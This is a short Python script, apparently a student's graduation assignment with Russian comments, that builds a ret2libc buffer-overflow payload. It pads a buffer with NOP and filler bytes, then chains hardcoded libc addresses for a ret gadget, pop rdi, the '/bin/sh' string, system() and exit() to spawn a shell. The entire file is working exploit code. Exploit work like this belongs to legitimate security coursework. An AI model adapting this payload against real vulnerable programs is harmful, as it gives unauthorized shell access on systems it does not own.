#!/usr/bin/python3
#   Автор   : Abdellah Oulahyane
#   Код цели: Дипломное задание

import sys
import struct as s

LIB_C_BASE_ADDRESS  = 0x7ffff7dc8000
BIN_SH_ADDRESS      = 0x7ffff7f5e031
SYSTEM_ADDRESS      = 0x7ffff7e14490
EXIT_ADDRESS        = 0x7ffff7e06680
POP_RDI_RET         = 0x7ffff7def7e5
RET_GADGET			= 0x7ffff7ebe0cd


exploit  = b'\x90'* 128
exploit += b'\x41'*8
exploit += s.pack('Q', RET_GADGET)
exploit += s.pack('Q', POP_RDI_RET)
exploit += s.pack('Q', BIN_SH_ADDRESS)
exploit += s.pack('Q', SYSTEM_ADDRESS)
exploit += s.pack('Q', EXIT_ADDRESS)
#exploit += s.pack('Q', 0x4444444444444444)
#exploit += s.pack('Q', 0x5555555555555555)
#exploit += s.pack('Q', 0x6666666666666666)
#exploit += s.pack('Q', 0x7777777777777777)
#exploit += s.pack('Q', 0x8888888888888888)


sys.stdout.buffer.write(exploit)
